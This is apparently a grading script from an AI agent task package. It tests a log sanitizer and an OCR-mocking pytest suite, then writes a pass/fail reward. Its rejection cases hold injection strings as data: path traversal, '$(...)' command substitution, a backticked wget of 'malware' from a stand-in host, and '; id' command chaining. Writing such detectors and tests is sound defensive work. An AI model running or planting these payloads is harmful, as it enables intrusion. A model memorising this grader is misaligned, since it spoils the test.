#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import ast
import importlib.util
import inspect
import os
import random
import re
import string
import subprocess
import sys
from pathlib import Path

VENV_PYTHON = '/home/user/venv/bin/python'
SANITIZER_PATH = '/home/user/sanitizer.py'
TEST_PATH = '/home/user/test_sanitizer.py'
REPORT_PATH = '/home/user/test_report.log'


def load_sanitizer():
    spec = importlib.util.spec_from_file_location('sanitizer', SANITIZER_PATH)
    sanitizer = importlib.util.module_from_spec(spec)
    sys.modules['sanitizer'] = sanitizer
    try:
        spec.loader.exec_module(sanitizer)
    except Exception as exc:
        assert False, f'Failed to load sanitizer.py: {exc}'
    return sanitizer


def test_venv_exists_and_packages_installed():
    assert os.path.isdir('/home/user/venv'), 'Virtual environment /home/user/venv does not exist.'
    assert os.path.isfile(VENV_PYTHON), 'Python binary not found in venv.'

    check = subprocess.run(
        [VENV_PYTHON, '-c',
         "import pytest, pytesseract; from PIL import Image; "
         "from importlib.metadata import version; "
         "[version(x) for x in ('pytest','pytesseract','Pillow')]"],
        text=True, capture_output=True, timeout=30
    )
    assert check.returncode == 0, 'Required packages are not installed in the venv: ' + check.stderr


def test_sanitizer_module_and_fixed_corpus():
    assert os.path.isfile(SANITIZER_PATH), f'{SANITIZER_PATH} does not exist.'
    sanitizer = load_sanitizer()
    assert hasattr(sanitizer, 'sanitize_log'), 'sanitize_log function not found in sanitizer.py'
    assert callable(sanitizer.sanitize_log), 'sanitize_log is not callable'

    signature = inspect.signature(sanitizer.sanitize_log)
    parameters = list(signature.parameters.values())
    assert len(parameters) == 1 and parameters[0].name == 'content', \
        'sanitize_log must have the signature sanitize_log(content: str) -> bool'

    clean_dir = '/app/corpus/clean'
    evil_dir = '/app/corpus/evil'
    clean_failed = []
    for name in os.listdir(clean_dir):
        filepath = os.path.join(clean_dir, name)
        if not os.path.isfile(filepath):
            continue
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as handle:
            result = sanitizer.sanitize_log(handle.read())
            if result is not True:
                clean_failed.append(name)

    evil_failed = []
    for name in os.listdir(evil_dir):
        filepath = os.path.join(evil_dir, name)
        if not os.path.isfile(filepath):
            continue
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as handle:
            result = sanitizer.sanitize_log(handle.read())
            if result is not False:
                evil_failed.append(name)

    errors = []
    if clean_failed:
        errors.append(f'{len(clean_failed)} clean files were incorrectly rejected: {clean_failed[:5]}')
    if evil_failed:
        errors.append(f'{len(evil_failed)} evil files bypassed sanitization: {evil_failed[:5]}')
    assert not errors, ' | '.join(errors)


def test_sanitizer_on_unseen_derived_inputs():
    sanitizer = load_sanitizer()
    rng = random.SystemRandom()
    token = ''.join(rng.choice(string.ascii_letters) for _ in range(18))
    number = rng.randrange(10000, 99999999)

    clean_inputs = [
        f'[INFO] Scan completed successfully. Items: {number}\n',
        f'[DEBUG] Validation completed successfully. Token: {token}\n',
        f'[WARNING] Input was safely rejected. Reference: {token}_{number}\n',
        f'[ERROR] Scan failed safely. File: report_{token}.txt\n',
        f'[INFO] User input: ordinary_{token}_{number}\n',
    ]
    evil_inputs = [
        f'[ERROR] Scan failed. File: ../../../../tmp/{token}\n',
        f'[INFO] User input: $(echo {token})\n',
        f'[DEBUG] Payload: `wget http://{token}.invalid/malware`\n',
        f'[WARNING] Invalid char: {token}\x00\x00\n',
        f'[INFO] Executing: ; id {token}\n',
    ]

    for content in clean_inputs:
        result = sanitizer.sanitize_log(content)
        assert result is True, f'Unseen clean log was rejected: {content!r}'
        assert type(result) is bool, 'sanitize_log must return a bool'
    for content in evil_inputs:
        result = sanitizer.sanitize_log(content)
        assert result is False, f'Unseen injection payload was accepted: {content!r}'
        assert type(result) is bool, 'sanitize_log must return a bool'


def test_sanitizer_is_state_machine_based():
    source = Path(SANITIZER_PATH).read_text(encoding='utf-8')
    tree = ast.parse(source)
    functions = [n for n in ast.walk(tree)
                 if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef)) and n.name == 'sanitize_log']
    assert functions, 'sanitize_log must be defined as a function'
    function = functions[0]
    loops = [n for n in ast.walk(function) if isinstance(n, (ast.For, ast.While))]
    branches = [n for n in ast.walk(function) if isinstance(n, ast.If)]
    assert loops, 'sanitize_log does not contain the iteration required for a state-machine parser'
    assert branches, 'sanitize_log does not contain state-dependent branching'
    assert any(any(isinstance(x, (ast.Assign, ast.AnnAssign, ast.AugAssign)) for x in ast.walk(loop))
               for loop in loops), 'sanitize_log does not update parser state while consuming input'


def test_harness_ocr_mock_and_report():
    assert os.path.isfile(TEST_PATH), f'{TEST_PATH} does not exist.'
    assert os.path.isfile(REPORT_PATH), f'{REPORT_PATH} does not exist.'

    source = Path(TEST_PATH).read_text(encoding='utf-8')
    tree = ast.parse(source)
    lowered = source.lower()
    assert '/app/corpus/clean' in source and '/app/corpus/evil' in source, \
        'pytest suite must cover both corpus directories'
    assert 'sanitiz' in lowered, 'pytest suite does not exercise sanitize_log'
    assert '/app/system_blueprint.png' in source, 'pytest suite does not read the blueprint image'
    assert ('pytesseract' in lowered or ('subprocess' in lowered and 'tesseract' in lowered)), \
        'pytest suite does not perform OCR using tesseract'
    assert any(word in lowered for word in ('unittest.mock', 'mock(', 'patch(', 'monkeypatch')), \
        'pytest suite does not mock the OCR reading step'
    assert any(isinstance(node, (ast.For, ast.While)) for node in ast.walk(tree)), \
        'pytest suite does not iterate over the corpora'
    assert any(isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)) and node.name.startswith('test_')
               for node in ast.walk(tree)), 'pytest suite contains no tests'
    assert any(isinstance(node, ast.Assert) for node in ast.walk(tree)), \
        'pytest suite contains no assertions'

    run = subprocess.run(
        [VENV_PYTHON, '-m', 'pytest', TEST_PATH, '-x', '--tb=short'],
        cwd='/home/user', text=True, stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT, timeout=120
    )
    Path(REPORT_PATH).write_text(run.stdout, encoding='utf-8')
    assert run.returncode == 0, 'The submitted pytest suite failed:\n' + run.stdout
    assert re.search(r'\b[1-9][0-9]* passed\b', run.stdout), \
        'The test report does not show any successfully executed pytest tests'
    report = Path(REPORT_PATH).read_text(encoding='utf-8')
    assert report == run.stdout and 'passed' in report, \
        'test_report.log must contain the standard output from the pytest execution'
TEST_EOF

if python3 -m pytest --noconftest -c /dev/null -p no:cacheprovider /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
